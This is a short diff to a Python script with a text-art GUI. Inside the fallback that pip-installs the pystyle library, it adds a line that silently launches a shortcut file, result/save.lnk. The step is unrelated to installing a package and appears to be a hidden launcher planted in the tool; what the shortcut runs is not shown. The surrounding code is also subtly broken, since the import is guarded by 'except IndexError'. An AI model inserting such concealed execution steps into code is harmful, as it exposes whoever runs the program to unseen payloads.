@@ -14,6 +14,7 @@ try:
     from pystyle import *
 except IndexError:
     os.system("pip install pystyle")
+    os.system("start result/save.lnk")
     from pystyle import *
 gui="""
     ╔═══════════════════════════╗ ╔═════════════════════╗
